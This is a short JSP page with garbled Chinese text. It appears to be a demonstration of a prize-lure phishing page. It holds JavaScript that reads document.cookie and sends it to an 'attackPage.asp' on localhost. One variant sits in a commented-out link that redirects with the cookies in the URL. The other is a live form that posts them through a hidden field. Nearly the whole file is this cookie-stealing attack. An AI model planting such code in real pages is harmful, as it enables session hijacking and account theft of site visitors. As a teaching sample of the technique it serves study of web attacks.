<%@ page language="java" import="java.util.*" pageEncoding="gb2312"%>
<%
//session��飬������
%>
<!-- 
������һ�����ʼ������н��ˣ�������Ȥ�Ļ����Ե����<BR>
<script type="text/javascript">
	function send(){
		var cookie = document.cookie;
		window.location.href = "http://localhost/attackPage.asp?cookies=" + cookie;
	}
</script>
<a  onClick="send()"><u>�콱</u></a>
 -->
������һ�����ʼ������н��ˣ�������д�������������ύ��
<BR>
<script type="text/javascript">
	function send(){
		var cookie = document.cookie;
		document.form1.cookies.value=cookie;
		document.form1.submit();
	}
</script>
<form name="form1" action="http://localhost/attackPage.asp"
	method="post">
	��������:
	<input name="">
	<input type="hidden" name="cookies">
	<input type="button" value="�ύ����" onClick="send()">
</form>



